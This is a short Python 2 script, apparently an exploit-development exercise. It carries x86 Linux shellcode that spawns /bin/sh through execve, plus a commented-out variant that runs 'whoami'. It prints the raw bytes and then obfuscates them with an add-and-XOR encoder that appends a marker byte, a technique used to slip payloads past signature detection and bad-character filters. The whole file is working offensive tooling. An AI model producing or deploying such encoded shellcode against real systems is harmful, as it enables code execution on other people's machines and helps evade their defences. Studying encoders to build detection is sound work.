import os


#hex = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80"
hex = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


#bin = {0x6a,0x0b,0x58,0x99,0x52,0x66,0x68,0x2d,0x63,0x89,0xe7,0x68,0x2f,0x73,0x68,0x00,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x52,0xe8,0x07,0x00,0x00,0x00,0x77,0x68,0x6f,0x61,0x6d,0x69,0x00,0x57,0x53,0x89,0xe1,0xcd,0x80}

#print hex


#bin = "6a0b58995266682d6389e7682f736800682f62696e89e352e80700000077686f616d6900575389e1cd80" 

bin_arr = []
for i in bytearray(hex):
	bin_arr.append(i)


print "Original Shellcode"
print "\\x" + "\\x".join(format(i,"02x") for i in bin_arr )


encoded_arr = []
for i in bytearray(hex):
        encoded_arr.append((i+15) ^ 15)


encoded_arr.append(15)

print "\n"


print "Encoded Shellcode"
print "0x" + ",0x".join(format(i,"02x") for i in encoded_arr)


